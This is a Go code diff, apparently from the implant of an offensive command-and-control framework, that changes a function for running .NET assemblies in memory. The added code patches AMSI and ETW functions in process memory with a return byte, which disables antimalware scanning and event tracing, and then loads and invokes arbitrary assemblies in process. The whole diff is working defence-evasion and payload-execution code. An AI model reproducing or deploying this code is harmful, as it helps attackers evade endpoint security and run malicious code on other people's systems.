@@ -248,22 +248,29 @@ func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime 
 			amsiInitialize.Addr(),
 			amsiScanString.Addr(),
 		}
+		patch := byte(0xC3)
 		for _, addr := range amsiAddr {
-			var oldProtect uint32
-			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
-			if err != nil {
-				//{{if .Config.Debug}}
-				log.Println("VirtualProtect failed:", err)
-				//{{end}}
-				return "", err
-			}
-			*(*byte)(unsafe.Pointer(addr)) = 0xC3
-			err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
-			if err != nil {
-				//{{if .Config.Debug}}
-				log.Println("VirtualProtect (restauring) failed:", err)
-				//{{end}}
-				return "", err
+			// skip if already patched
+			if *(*byte)(unsafe.Pointer(addr)) != patch {
+				// {{if .Config.Debug}}
+				log.Println("Patching AMSI")
+				// {{end}}
+				var oldProtect uint32
+				err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
+				if err != nil {
+					//{{if .Config.Debug}}
+					log.Println("VirtualProtect failed:", err)
+					//{{end}}
+					return "", err
+				}
+				*(*byte)(unsafe.Pointer(addr)) = 0xC3
+				err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
+				if err != nil {
+					//{{if .Config.Debug}}
+					log.Println("VirtualProtect (restauring) failed:", err)
+					//{{end}}
+					return "", err
+				}
 			}
 		}
 	}
@@ -272,21 +279,28 @@ func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime 
 		etwEventWriteProc := ntdll.NewProc("EtwEventWrite")
 
 		// patch
-		var oldProtect uint32
-		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
-		if err != nil {
-			//{{if .Config.Debug}}
-			log.Println("VirtualProtect failed:", err)
-			//{{end}}
-			return "", err
-		}
-		*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
-		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
-		if err != nil {
-			//{{if .Config.Debug}}
-			log.Println("VirtualProtect (restauring) failed:", err)
-			//{{end}}
-			return "", err
+		patch := byte(0xC3)
+		// skip if already patched
+		if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
+			// {{if .Config.Debug}}
+			log.Println("Patching ETW")
+			// {{end}}
+			var oldProtect uint32
+			err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
+			if err != nil {
+				//{{if .Config.Debug}}
+				log.Println("VirtualProtect failed:", err)
+				//{{end}}
+				return "", err
+			}
+			*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
+			err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
+			if err != nil {
+				//{{if .Config.Debug}}
+				log.Println("VirtualProtect (restauring) failed:", err)
+				//{{end}}
+				return "", err
+			}
 		}
 	}
 	err := clr.RedirectStdoutStderr()
@@ -316,13 +330,10 @@ func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime 
 	// {{if .Config.Debug}}
 	log.Printf("using runtime: %s", rt)
 	// {{end}}
-	runtimeHost, err := clr.LoadCLR(rt)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("could not load runtime: %v\n", err)
-		// {{end}}
-		return "", err
-	}
+	runtimeHost := clrInstance.GetRuntimeHost(rt)
+	// {{if .Config.Debug}}
+	log.Println("CLR loaded")
+	// {{end}}
 	methodInfo, err := clr.LoadAssembly(runtimeHost, assemblyBytes)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -330,6 +341,13 @@ func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime 
 		// {{end}}
 		return "", err
 	}
+	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
+		assemblyArgs = []string{" "}
+	}
+	// {{if .Config.Debug}}
+	log.Printf("Assembly loaded, methodInfo: %+v\n", methodInfo)
+	log.Printf("Calling assembly with args: %+v\n", assemblyArgs)
+	// {{end}}
 	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
 	return fmt.Sprintf("%s\n%s", stdout, stderr), nil
 }
